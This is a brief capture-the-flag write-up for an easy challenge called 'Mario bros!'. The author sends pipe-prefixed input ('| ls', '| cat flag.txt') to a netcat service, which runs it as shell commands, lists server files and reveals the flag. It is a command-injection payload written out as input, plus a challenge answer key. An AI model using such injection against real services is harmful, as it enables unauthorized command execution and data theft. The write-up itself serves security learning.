# Mario bros!
100 points
Solves: 121  Easy
Read the flag!

nc 159.223.209.120 7777

## Solving

The hint was: `marios favorite shortcut` and I was instantly thinking about `|` pipes.
So if your input is:

```shell
nc 159.223.209.120 7777
Are you root?
| ls
entrypoint.sh
flag.txt
pwn.sh
ucspi-tcp-0.88
ucspi-tcp-0.88.errno.patch
ucspi-tcp-0.88.tar.gz
lol ur not root!
```

you'll get the local filesystem. So if we use `| cat flag.txt` instead, we get our flag.

```shell
nc 159.223.209.120 7777
Are you root?
| cat flag.txt
EZ-CTF{UNSECUR3_B4SH}
lol ur not root!
```

Yippi! Flag:

> EZ-CTF{UNSECUR3_B4SH}
